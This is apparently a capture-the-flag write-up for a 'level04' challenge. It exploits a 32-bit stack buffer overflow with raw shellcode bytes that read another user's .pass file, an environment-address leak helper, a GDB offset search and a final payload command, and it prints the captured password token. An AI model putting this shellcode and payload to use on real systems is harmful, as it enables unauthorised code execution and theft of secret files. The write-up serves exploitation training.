# level04

1. Overview / Static analysis

   * Classic **stack buffer overflow** that overwrites the saved return address (EIP) and redirects execution to attacker‑supplied **shellcode**.
   * Shellcode is stored in an **environment variable** (`SHELLCODE`) to get a relatively stable location that can be leaked at runtime.
   * Target is **32‑bit**; addresses are 4 bytes and written **little‑endian** in the payload.

2. Vulnerability & plan of attack

   * Overflow a stack buffer during input, control EIP, and pivot execution into the shellcode placed in `SHELLCODE`.
   * Steps:

     1. Export shellcode into env.
     2. Leak `getenv("SHELLCODE")` to obtain its runtime address.
     3. Find the exact **offset to EIP** with a cyclic pattern under GDB (found to be **156** bytes).
     4. Build final payload = `A * 156` + `<addr_of_shellcode>` (little‑endian) and feed it to the program.

3. Preparing shellcode in the environment

   The shellcode opens and reads `/home/users/level05/.pass` and prints it. Export it as an environment variable:

   ```bash
   export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
   ```

4. Leaking the shellcode address

   Compile a tiny helper (32‑bit) to print `getenv("SHELLCODE")` and run it to capture the pointer:

   ```bash
   printf '%s\n' '#include <stdio.h>' '#include <stdlib.h>' 'int main(void){ printf("%p\n", getenv("SHELLCODE")); return 0; }' > /tmp/_tmp.c \
     && gcc -O2 -m32 /tmp/_tmp.c -o /tmp/_tmp \
     && /tmp/_tmp \
     && rm -f /tmp/_tmp /tmp/_tmp.c
   # example output on the author\'s system:
   0xffffd8b8
   ```

   Example leaked address: **`0xffffd8b8`** (in the environment area).

5. Finding the overflow offset (under GDB)

   Use a cyclic pattern for the crashing input. The program crashes with EIP = `0x41326641`, from which the EIP overwrite **offset = 156** bytes was determined.

   ```bash
   (gdb) set follow-fork-mode child
   (gdb) run
   Starting program: /home/users/level04/level04
   Give me some shellcode, k
   # long input...
   Program received signal SIGSEGV, Segmentation fault.
   0x41326641 in ?? ()   # offset -> 156
   ```

6. Exploit construction

   **Payload layout:**

   ```
   [ 156 x 'A' ]  [ <addr_of_SHELLCODE> ]
                  ^ little-endian 4 bytes (e.g., 0xffffd8b8 -> \xb8\xd8\xff\xff)
   ```

   **Final command (using the example leaked addr):**

   ```bash
   python -c "print('A'*156 + '\xb8\xd8\xff\xff')" | ./level04
   ```

   Example run (author):

   ```
   Give me some shellcode, k
   3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
   ```

7. Notes & caveats

   * **ASLR**: If enabled, the environment address may vary across runs. The technique assumes a stable env layout; otherwise disable ASLR or obtain a fresh leak each run.
   * **Architecture**: Keep consistency between the helper and the target (use `-m32` as shown); pack addresses as **little‑endian**.
   * **Reliability**: If the jump is flaky, add a small **NOP sled** in the environment payload before the shellcode bytes and land anywhere within it.

8. Token discovered

   Token `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
